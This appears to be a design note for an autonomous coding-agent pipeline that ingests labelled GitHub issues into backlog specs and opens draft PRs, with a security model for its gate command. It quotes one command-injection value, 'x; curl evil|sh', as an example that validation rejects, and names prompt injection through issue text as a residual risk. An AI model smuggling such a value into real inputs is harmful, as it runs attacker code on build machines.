# Renewable foreign WALK source (ADR 0182 phase 2 + ADR 0186)

**Goal:** make foreign daily production self-sustaining — the daily loop keeps
finding foreign work without the operator hand-authoring each backlog spec.

**Mechanism:** a daily WALK top-up ingests OPEN, operator-LABELLED GitHub issues
from operator-registered foreign repos into FOREIGN backlog specs (`repo` +
`verify_cmd`) that the existing picker → soak → foreign-PR path consumes unchanged.

## Flow

1. Operator files an issue on a foreign repo with a fenced ```yaml spec block
   (`goal`, `files`, `test`) and labels it `crawl`.
2. The daily driver runs `chimera backlog from-issues --walk` (top-up) before
   selecting a spec. WALK reads `mind/walk_repos.yaml`, fetches each repo's
   labelled open issues, and writes a foreign spec per crawl-ready issue.
3. The picker selects it; the soak clones the foreign repo, the agent makes the
   scoped change, the foreign verify_cmd gates it, and a DRAFT PR opens
   (graduated past the approval floor; still allowlist + scope gated).

## Security model (the load-bearing part)

The daily loop will EXECUTE the gate command and run an agent against issue-derived
scope, autonomously. The trust boundary:

- **`verify_cmd` is OPERATOR-TRUSTED, never from issue bodies.** Each walk_repos
  entry carries a `verify_cmd_template` (operator-authored config), e.g.
  `"uv run --extra dev pytest {test} -q"`. The ONLY issue-derived substitution is
  `{test}` — a path, STRICTLY validated: relative, no `..`, charset
  `[A-Za-z0-9._/-]`, and MUST be one of the issue's `files` allowlist. So an issue
  can never inject shell into the gate (`test: "x; curl evil|sh"` fails validation).
- **Repo allowlist** (existing B.2/B.4): only `CHIMERA_REPO_ALLOWLIST` owners
  (`elementalcollision`) — the operator's own repos.
- **Label gate** (existing): only issues labelled `crawl` (per-repo configurable)
  are ingested — the operator opts each task in by labelling it.
- **Per-repo foreign-PR review** (existing M4): the PR only FIRES if the repo's
  verify_cmd is `chimera foreign-pr review`-ed — independent of WALK.
- **Idempotent-ADD**: WALK writes a spec ONLY if the target file does not exist —
  it never overwrites operator edits, `done:` markers, or dispatch state, so a
  re-ingest can't resurrect a completed task. Closed issues aren't fetched.
- **Draft + B.4f/g/h**: output is a reviewable draft; the agent's edits are
  reverted to the allowlist; ruff is charter-confined.

Residual: the issue `goal` becomes the agent's task text (prompt-injection surface).
Bounded by the allowlist (operator's own repos), the label gate (operator opt-in),
the sandboxed tool surface, and draft + human review. Acceptable for trusted repos;
revisit before ingesting repos with untrusted issue authors.

## Components

- `issue_backlog.py`: `foreign=` + `verify_cmd_template=` on
  `issue_to_spec_markdown`/`ingest_issues`; `_safe_test_path`; idempotent-add;
  `load_walk_repos(mind_dir)`.
- `mind/walk_repos.yaml`: operator-curated `{repo, label, verify_cmd_template}`.
- CLI `from-issues --walk` (all configured) and `--foreign --verify-cmd-template`
  (one-off).
- `crawl_daily.sh`: a fail-soft WALK top-up step before selection.
